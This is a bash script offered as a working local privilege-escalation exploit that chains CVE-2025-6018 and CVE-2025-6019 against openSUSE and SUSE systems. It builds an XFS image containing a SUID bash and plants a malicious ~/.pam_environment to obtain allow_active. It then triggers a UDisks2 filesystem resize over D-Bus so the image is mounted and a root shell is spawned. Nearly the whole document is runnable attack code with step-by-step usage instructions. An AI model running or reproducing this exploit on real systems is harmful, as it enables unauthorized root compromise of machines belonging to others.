#!/bin/bash
#
# CVE-2025-6018 + CVE-2025-6019 Chain Exploit ..probably..
# PAM Environment Injection → UDisks2 Privilege Escalation
#

set -e

# Colors
R='\033[0;31m' G='\033[0;32m' Y='\033[1;33m'
B='\033[0;34m' C='\033[0;36m' M='\033[0;35m' NC='\033[0m'

banner() {
    echo -e "${C}╔═══════════════════════════════════════════════════╗"
    echo "║  CVE-2025-6018 + CVE-2025-6019 Chain Exploit     ║"
    echo "║  PAM Injection → UDisks2 LPE → Root Shell        ║"
    echo -e "╚═══════════════════════════════════════════════════╝${NC}\n"
}

log() { echo -e "${2:-$B}[${1:0:1}]${NC} ${@:2}"; }

# STAGE 1: Create XFS image with SUID bash (run as root on attacker machine)
stage1() {
    log "* STAGE 1: Creating XFS Image with SUID bash" "$Y"
    
    [ "$(id -u)" -ne 0 ] && { log "- Requires root!" "$R"; return 1; }
    
    local img="${1:-./xfs.image}"
    
    # Check dependencies
    for tool in dd mkfs.xfs mount umount; do
        command -v $tool &>/dev/null || {
            log "- Missing: $tool (install xfsprogs)" "$R"; return 1;
        }
    done
    
    # Create and format image
    log "* Creating 300MB image..." "$Y"
    [ -f "$img" ] && rm -f "$img"
    dd if=/dev/zero of="$img" bs=1M count=300 status=none
    mkfs.xfs -f "$img" >/dev/null 2>&1
    
    # Mount and setup SUID bash
    local mnt=$(mktemp -d)
    mount -o loop "$img" "$mnt" || { log "- Mount failed" "$R"; return 1; }
    
    cp /bin/bash "$mnt/bash"
    chown root:root "$mnt/bash"
    chmod 4755 "$mnt/bash"
    
    [ ! -u "$mnt/bash" ] && { log "- SUID not set!" "$R"; umount "$mnt"; return 1; }
    
    log "+ SUID bash configured" "$G"
    ls -lh "$mnt/bash"
    
    sync && umount "$mnt" && rmdir "$mnt"
    chmod 644 "$img"
    
    log "+ Image ready: $(realpath "$img")" "$G"
    echo -e "\n${Y}Next:${NC} Transfer to target and run stage2"
    echo -e "  ${C}scp $(basename "$img") user@target:/tmp/${NC}\n"
}

# STAGE 2: PAM environment injection (run on target)
stage2() {
    log "* STAGE 2: CVE-2025-6018 (PAM Injection)" "$Y"
    
    # System info
    [ -f /etc/os-release ] && source /etc/os-release
    log "i Target: ${PRETTY_NAME:-Unknown} | $(uname -r)"
    
    # Check PAM
    pam_ver=$(rpm -q pam 2>/dev/null || dpkg -l | grep -m1 libpam | awk '{print $3}')
    log "i PAM: $pam_ver"
    
    # Create malicious .pam_environment
    cat > ~/.pam_environment << 'EOF'
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
XDG_SESSION_TYPE OVERRIDE=x11
XDG_SESSION_CLASS OVERRIDE=user
XDG_RUNTIME_DIR OVERRIDE=/tmp/runtime
EOF
    
    log "+ Created ~/.pam_environment" "$G"
    cat ~/.pam_environment
    
    # Check if already exploited
    if gdbus call --system --dest org.freedesktop.login1 \
        --object-path /org/freedesktop/login1 \
        --method org.freedesktop.login1.Manager.CanReboot 2>/dev/null | grep -q "('yes',)"; then
        log "+ allow_active already obtained! Skip to stage3" "$G"
        return 0
    fi
    
    echo -e "\n${Y}Action required:${NC}"
    echo -e "  1. ${C}logout${NC}"
    echo -e "  2. ${C}ssh $(whoami)@$(hostname -I | awk '{print $1}')${NC}"
    echo -e "  3. ${C}$0 stage3 /tmp/xfs.image${NC}\n"
}

# STAGE 3: UDisks2 privilege escalation (run on target after stage2)
stage3() {
    log "* STAGE 3: CVE-2025-6019 (UDisks2 LPE)" "$Y"
    
    # Verify prerequisite
    if ! gdbus call --system --dest org.freedesktop.login1 \
        --object-path /org/freedesktop/login1 \
        --method org.freedesktop.login1.Manager.CanReboot 2>/dev/null | grep -q "('yes',)"; then
        log "- allow_active not obtained! Complete stage2 first" "$R"
        return 1
    fi
    
    log "+ allow_active confirmed" "$G"
    
    # Check dependencies
    for cmd in udisksctl gdbus killall; do
        command -v $cmd &>/dev/null || { log "- Missing: $cmd" "$R"; return 1; }
    done
    
    # Locate XFS image
    local img="${1:-/tmp/xfs.image}"
    [ ! -f "$img" ] && { log "- Image not found: $img" "$R"; return 1; }
    log "+ Image: $img" "$G"
    
    # Setup loop device
    killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null
    sleep 1
    
    log "* Setting up loop device..." "$Y"
    local loop_out=$(udisksctl loop-setup --file "$img" --no-user-interaction 2>&1)
    local loop_dev=$(echo "$loop_out" | grep -o '/dev/loop[0-9]*')
    
    [ -z "$loop_dev" ] && { log "- Loop setup failed" "$R"; return 1; }
    log "+ Loop device: $loop_dev" "$G"
    
    # Start watcher to keep FS mounted
    (while true; do
        [ -f /tmp/blockdev*/bash ] 2>/dev/null && break
        sleep 1
    done) &
    local watcher=$!
    
    # Trigger vulnerability
    log "* Triggering CVE-2025-6019..." "$Y"
    sleep 2
    
    local obj="/org/freedesktop/UDisks2/block_devices/$(basename "$loop_dev")"
    gdbus call --system --dest org.freedesktop.UDisks2 \
        --object-path "$obj" \
        --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' 2>&1 | \
        sed 's/^/  /' || true
    
    # Wait and search for SUID bash
    log "* Searching for SUID bash..." "$Y"
    sleep 3
    
    for i in {1..10}; do
        local tmp_dir=$(ls -d /tmp/blockdev* 2>/dev/null | head -n1)
        
        if [ -n "$tmp_dir" ] && [ -f "$tmp_dir/bash" ] && [ -u "$tmp_dir/bash" ]; then
            log "+ SUID bash found!" "$G"
            ls -la "$tmp_dir/bash"
            
            echo -e "\n${G}╔═══════════════════════════════════════╗"
            echo "║   EXPLOITATION SUCCESSFUL - ROOT!     ║"
            echo -e "╚═══════════════════════════════════════╝${NC}\n"
            
            log "* Spawning root shell..." "$M"
            echo -e "${C}Use 'exit' to return${NC}\n"
            
            "$tmp_dir/bash" -p
            
            # Cleanup
            kill $watcher 2>/dev/null
            log "* Exited root shell" "$Y"
            return 0
        fi
        
        sleep 2
    done
    
    kill $watcher 2>/dev/null
    log "- Exploit failed - SUID bash not found" "$R"
    return 1
}

# Auto mode
auto() {
    banner
    
    if [ "$(id -u)" -eq 0 ]; then
        log "! Root detected - running stage1" "$Y"
        stage1 "$1"
    elif gdbus call --system --dest org.freedesktop.login1 \
        --object-path /org/freedesktop/login1 \
        --method org.freedesktop.login1.Manager.CanReboot 2>/dev/null | grep -q "('yes',)"; then
        log "+ allow_active obtained - running stage3" "$G"
        stage3 "$1"
    else
        log "! Running stage2" "$Y"
        stage2
    fi
}

# Help
show_help() {
    banner
    cat << EOF
${C}Usage:${NC}
  $0 stage1 [path]    Create XFS image (as root on attacker)
  $0 stage2           PAM injection (on target)
  $0 stage3 [image]   UDisks2 exploit (on target → ROOT)
  $0 auto [image]     Automatic mode
  $0 help             Show this help

${C}Example Attack Flow:${NC}
  ${Y}# Attacker machine (as root):${NC}
  sudo $0 stage1
  scp xfs.image user@target:/tmp/

  ${Y}# Target machine:${NC}
  $0 stage2
  logout
  ssh user@target
  $0 stage3 /tmp/xfs.image

${C}Target:${NC} openSUSE Leap 15.x / SUSE systems
EOF
}

# Main
case "$1" in
    stage1) banner; stage1 "$2" ;;
    stage2) banner; stage2 ;;
    stage3) banner; stage3 "$2" ;;
    auto) auto "$2" ;;
    help|--help|-h) show_help ;;
    *) banner; echo -e "${Y}Usage:${NC} $0 {stage1|stage2|stage3|auto|help}"; exit 1 ;;
esac
